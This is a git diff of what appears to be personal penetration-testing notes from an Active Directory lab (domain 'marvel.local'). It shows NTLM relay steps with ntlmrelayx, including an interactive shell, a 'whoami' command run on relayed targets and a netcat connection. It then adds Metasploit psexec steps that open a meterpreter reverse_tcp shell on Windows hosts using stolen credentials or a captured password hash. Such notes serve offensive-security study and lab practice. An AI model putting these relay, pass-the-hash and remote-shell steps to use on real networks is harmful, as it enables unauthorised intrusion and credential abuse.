@@ -28,3 +28,25 @@ If you get a hash from responder, you can relay the hash to other shares without
 7. Alternative for interactive shell -- ```sudo ntlmrelayx.py -tf targets.txt -smbsupport -i```
 8. ```nc 127.0.0.1 11000```
 9. Alternative -- sudo ntlmrelayx -tf targets.txt -smb2support -c "whoami"
+
+## Gaining a shell
+### Shell with domain
+1. start metasploit
+2. use module psexec - exploit/windows/smb/psexec
+3. Verify payload for 64 bit-- use windows/x64/meterpreter/reverse_tcp
+4. Set RHOST
+5. set smbdomain -- ```set smbdomain marvel.local```
+6. set smbuser
+7. set smbpass
+8. exploit
+### Shell with hash
+1. start metasploit
+2. use module psexec - exploit/windows/smb/psexec
+3. Verify payload for 64 bit-- use windows/x64/meterpreter/reverse_tcp
+4. Set RHOST
+5. unset domain
+6. Copy all of this <img width="847" height="82" alt="image" src="https://github.com/user-attachments/assets/8346761e-b29e-483d-8772-cf26ab9806ef" />
+7. set smb pass and paste what you copied
+8. exploit
+
+
